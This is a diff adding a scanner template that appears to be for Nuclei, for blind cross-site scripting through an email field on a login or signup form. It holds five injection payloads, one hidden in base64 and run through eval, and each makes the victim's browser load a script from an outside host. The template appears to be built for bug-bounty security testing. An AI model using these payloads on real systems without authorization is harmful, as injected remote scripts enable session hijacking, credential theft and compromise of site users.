@@ -1,0 +1,32 @@
+id: email-blind-xss
+
+info:
+  name: Blind Cross Site Scripting
+  author: reewardius
+  severity: high
+  tags: fuzzing-xss,blind-xss
+  
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        email={{url_encode(payload)}}&password=123123
+        
+    payloads:
+      payload:
+        - "dimka@gmail.com`'\"><script src=//js.rip/bugbounty></script>"
+        - "dimka@gmail.com`'\"></script></title></textarea><script src=//js.rip/bugbounty></script>"
+        - "dimka@gmail.com--></tiTle></stYle></texTarea></scrIpt>\"//'//><scrIpt src=\"https://js.rip/bugbounty\"></scrIpt>"
+        - "dimka@gmail.com`'\"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''\"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2J1Z2JvdW50eSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))//"
+        - "dimka@gmail.com--></noscript></title></textarea></style></template></noembed></script><script src='https://js.rip/bugbounty'></script>"
+        
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script src=//js.rip/bugbounty"
